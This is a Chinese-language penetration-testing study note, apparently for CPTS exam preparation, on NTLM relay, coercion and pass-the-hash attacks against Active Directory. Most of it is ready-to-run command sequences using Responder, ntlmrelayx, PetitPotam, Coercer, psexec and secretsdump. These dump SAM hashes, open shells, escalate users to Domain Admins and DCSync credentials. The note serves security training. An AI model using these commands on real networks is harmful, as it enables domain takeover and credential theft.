# 第 76 章 - NTLM 攻擊

## 標籤

- #cpts
- #chapter
- #active-directory
- #ntlm

## 學習目標

- 深入理解 NTLM Relay 的完整執行流程與前提條件。
- 知道不同 Relay 目標（SMB / LDAP / HTTP）的利用差異。
- 能做 coercion（強制認證）讓高權帳號主動送 hash 過來。
- 判斷什麼時候 Relay 比 Responder 捕捉 + 破解更有效。

---

## 理論基礎：NTLM Relay 核心原理

NTLM 認證是「挑戰-回應」協定，設計上讓**伺服器**驗證**客戶端**。Relay 攻擊的核心是：

```
正常流程：
Client → Server A（NTLM 認證）

Relay 攻擊：
Client → 攻擊者（偽裝成 Server A）
攻擊者 → Server B（把 Client 的 NTLM 認證轉發過去）
結果：攻擊者以 Client 的身份在 Server B 上認證成功
```

**關鍵前提（缺一不可）：**

1. **Client 主動送 NTLM** → 需要 Responder/coercion 觸發
2. **Server B 沒有 SMB Signing** → 否則 relay 會失敗（簽名驗證失敗）
3. **Client 的身份在 Server B 上有權限** → 沒權限 relay 進去也沒用

---

## 前提檢查：找無 SMB Signing 的機器

```bash
# 掃網段找無 SMB signing 的機器
nxc smb 172.16.0.0/24 --gen-relay-list /tmp/relay_targets.txt
# --gen-relay-list → 自動把 signing=False 的機器 IP 寫入檔案
#                    這個清單直接給 ntlmrelayx 的 -tf 用

# 手動確認單台
nxc smb TARGET_IP --check-modules
# 或看 nxc 輸出中的 signing: False
```

---

## 攻擊一：Responder + ntlmrelayx（標準 Relay）

### 理論

Responder 回應 LLMNR/NBT-NS 廣播，讓客戶端把 NTLM 認證送到攻擊者這裡。攻擊者不破解而是把認證轉發給目標機器。

```bash
# Step 1：關閉 Responder 的 SMB 和 HTTP（讓 ntlmrelayx 接）
sudo nano /etc/responder/Responder.conf
# 修改：
# SMB = Off
# HTTP = Off

# Step 2：啟動 Responder（只做毒化，不接 NTLM）
sudo responder -I eth0 -wv
# -I eth0 → 監聽的網路介面
# -w      → 啟用 WPAD proxy 毒化（讓 HTTP 流量也過來）
# -v      → verbose 模式（顯示抓到的請求）

# Step 3：同時啟動 ntlmrelayx（轉發認證）
python3 ntlmrelayx.py -tf /tmp/relay_targets.txt -smb2support
# -tf /tmp/relay_targets.txt → 轉發目標清單（nxc --gen-relay-list 生成）
# -smb2support               → 支援 SMB2 協定（現代 Windows 需要）
# 預設行為：dump 目標機器的 SAM database（取得所有本機使用者 hash）

# 互動式 shell（加 -i）
python3 ntlmrelayx.py -tf /tmp/relay_targets.txt -smb2support -i
# -i → 開啟互動式 SMB client session
# ntlmrelayx 輸出會顯示 local port，用 nc 連
nc 127.0.0.1 11000   # port 號看 ntlmrelayx 輸出

# 執行指令（不需要互動 shell）
python3 ntlmrelayx.py -tf /tmp/relay_targets.txt -smb2support -c "whoami"
# -c "COMMAND" → relay 成功後在目標上執行這個指令
```

---

## 攻擊二：Relay 到 LDAP（Domain Admin 升權）

### 理論

如果 relay 的目標是 DC 的 LDAP（且 LDAP signing 未強制），且被 relay 的帳號有足夠 AD 權限，可以做 DCSync 或直接加帳號到 Domain Admins。

```bash
# Relay 到 DC 的 LDAP
python3 ntlmrelayx.py -t ldap://DC_IP -smb2support --no-dump
# -t ldap://DC_IP → 目標是 DC 的 LDAP（不是 SMB 清單）
# --no-dump       → 不 dump SAM（LDAP 不支援）

# Relay 到 LDAPS（更可能成功）
python3 ntlmrelayx.py -t ldaps://DC_IP -smb2support
# ldaps → LDAP over SSL（DC 預設允許，比 ldap 更穩）

# 配合 --escalate-user（把目標帳號加到 Domain Admins）
python3 ntlmrelayx.py -t ldaps://DC_IP --escalate-user USERNAME
# --escalate-user → relay 成功後用那個身份把 USERNAME 加到高權群組

# 配合 --add-computer（創建新機器帳號，配合 RBCD 攻擊）
python3 ntlmrelayx.py -t ldaps://DC_IP --add-computer ATTACKPC --computer-password 'Pass@123'
# --add-computer  → 創建機器帳號（AD 預設每個使用者可創建 10 個）
# --computer-password → 新機器帳號的密碼
```

---

## 攻擊三：Coercion（強制目標送 NTLM 過來）

### 理論

不是等 LLMNR 廣播，而是**主動強制**目標機器向你發起 NTLM 認證。這對於高權機器（如 DC）非常有用，可以讓 DC 主動送 NTLM 給你。

```bash
# PetitPotam（透過 MS-EFSRPC 強制認證）
python3 PetitPotam.py KALI_IP TARGET_IP
# KALI_IP    → 你要讓 TARGET 送 NTLM 到的 IP（你的 Responder 在這裡）
# TARGET_IP  → 強制認證的目標（可以是 DC）

# PrinterBug / SpoolSample（透過 Print Spooler 強制認證）
python3 printerbug.py DOMAIN/USERNAME:PASSWORD@TARGET_IP KALI_IP
# TARGET_IP → 有 Print Spooler 服務的機器
# KALI_IP   → 你要讓 TARGET 送 NTLM 到的 IP

# Coercer（整合多種 coercion 方法）
python3 Coercer.py coerce -l KALI_IP -t TARGET_IP -u USERNAME -p PASSWORD -d DOMAIN.LOCAL
# coerce  → 執行強制認證
# -l      → listener IP（你的 Responder/ntlmrelayx）
# -t      → 目標 IP

# 配合 relay 的完整流程
# Terminal 1：Responder（只毒化，不接）
sudo responder -I eth0 -v

# Terminal 2：ntlmrelayx（等 coercion 送來的 hash）
python3 ntlmrelayx.py -t ldaps://DC_IP -smb2support --add-computer ATTACKPC

# Terminal 3：觸發 coercion
python3 PetitPotam.py KALI_IP TARGET_IP
```

---

## 攻擊四：Pass-the-Hash（PTH）

（詳見 71-AD驗證 章節，此處只列速查）

```bash
# 確認 local admin（掃整個網段）
nxc smb 172.16.0.0/24 -u USERNAME -H 'LM:NT_HASH'

# 互動式 shell
evil-winrm -i TARGET -u USERNAME -H 'NT_HASH'

# SYSTEM shell
python3 psexec.py -hashes :NT_HASH DOMAIN/USERNAME@TARGET

# DCSync（dump 域所有帳號 hash）
python3 secretsdump.py -hashes :NT_HASH DOMAIN/USERNAME@DC_IP
# 需要 Domain Admin 或 DCSync 權限
```

---

## 判斷邏輯：NTLM 攻擊選哪種

```
你能控制的因素：
├── 能讓目標主動送 NTLM（Responder 毒化 / Coercion）
│   ├── 目標網段有無 SMB signing 的機器？
│   │   ├── 有 → ntlmrelayx + SMB → dump SAM（拿本機 hash）
│   │   └── 有 DC LDAP 可達且 signing 未強制 → relay 到 LDAP → 提權
│   └── 只能毒化、無 relay 目標 → hashcat 破解 Net-NTLMv2
└── 你已有 NTLM hash（從 lsass / secretsdump 拿到）
    ├── 是 NTLM hash（NT hash）→ PTH 直接使用
    └── 是 Net-NTLMv2（Responder 捕捉）→ 只能破解，不能 PTH
```

---

## 速查表

```bash
# 找無 SMB signing 的目標
nxc smb 172.16.0.0/24 --gen-relay-list /tmp/targets.txt

# 標準 Relay（dump SAM）
# Responder.conf: SMB=Off, HTTP=Off
sudo responder -I eth0 -wv
python3 ntlmrelayx.py -tf /tmp/targets.txt -smb2support

# Relay + 互動 shell
python3 ntlmrelayx.py -tf /tmp/targets.txt -smb2support -i
nc 127.0.0.1 11000

# Relay 到 LDAPS
python3 ntlmrelayx.py -t ldaps://DC_IP -smb2support --escalate-user MYUSER

# Coercion + Relay
python3 PetitPotam.py KALI_IP TARGET_IP
python3 Coercer.py coerce -l KALI_IP -t TARGET_IP -u USER -p PASS -d DOMAIN.LOCAL

# PTH
nxc smb TARGET -u USER -H 'LM:NT'
evil-winrm -i TARGET -u USER -H 'NT_HASH'
python3 psexec.py -hashes :NT_HASH DOMAIN/USER@TARGET
```

---

## 關聯筆記

- [[71-AD驗證|第 71 章 - AD 驗證（NTLM 基礎 + Responder）]]
- [[74-橫向移動|第 74 章 - 橫向移動]]
- [[77-ADACL濫用|第 77 章 - AD ACL 濫用（Relay 到 LDAP 後的操作）]]
- [[09-Volume-9-Active-Directory-Index|Vol.9 - Active Directory]]
